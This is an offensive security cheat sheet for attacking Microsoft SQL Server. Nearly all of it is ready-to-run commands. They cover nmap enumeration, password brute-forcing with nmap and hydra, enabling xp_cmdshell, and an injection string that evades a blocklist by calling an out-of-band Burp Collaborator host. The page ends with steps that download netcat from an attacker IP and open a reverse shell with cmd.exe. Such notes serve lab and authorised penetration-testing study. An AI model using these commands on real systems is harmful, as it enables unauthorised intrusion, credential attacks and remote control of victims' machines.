---
description: MSSQL - Microsoft SQL service. typically runs on TCP port 1433.
---

# MSSQL

## Enumeration

```
nmap [IP]
nmap --script ms-sql-info -p 1433 [IP]
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 [IP]
```

## Password attack

```
nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passwd=/root/Desktop/wordlist/100-common-passwords.txt [IP]
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt [IP] mssql
hydra -l sa –P /root/Desktop/pass.txt [IP] mssql
```

Connect to MSSQL instance with impacket-mssqlclient

```
impacket-mssqlclient machine_name/user@[IP] -windows-auth
```

Enable xp\_cmdshell

```
#this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'

# Bypass blackisted "EXEC xp_cmdshell"
‘; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net’ —
```

Check what role the user has on the server

```
SQL> SELECT is_srvrolemember('sysadmin');
              

-----------   

          1   
```

Download netcat to the victim and create a reverse shell

```
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://10.10.14.9/nc64.exe -outfile nc64.exe"

SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
10.10.14.9 443"
```
